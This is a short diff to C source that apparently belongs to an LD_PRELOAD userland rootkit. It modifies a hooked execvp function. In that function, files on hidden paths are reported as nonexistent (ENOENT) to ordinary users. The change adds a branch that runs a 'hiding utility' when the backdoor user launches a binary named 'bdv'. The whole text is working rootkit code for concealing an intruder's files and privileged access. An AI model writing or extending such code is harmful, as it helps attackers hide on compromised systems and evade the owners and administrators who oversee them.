@@ -2,9 +2,17 @@ int execvp(const char *filename, char *const argv[]){
 #ifdef DO_REINSTALL
     if(!not_user(0)) reinstall();
 #endif
+
     hook(CEXECVP);
 
-    if(is_bdusr()) return (long)call(CEXECVP, filename, argv);
+    if(is_bdusr()){
+#ifdef HIDING_UTIL
+        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
+            dohiding_util(argv);
+#endif
+        return (long)call(CEXECVP, filename, argv);
+    }
+
     if(hidden_path(filename)){
         errno = ENOENT;
         return -1;
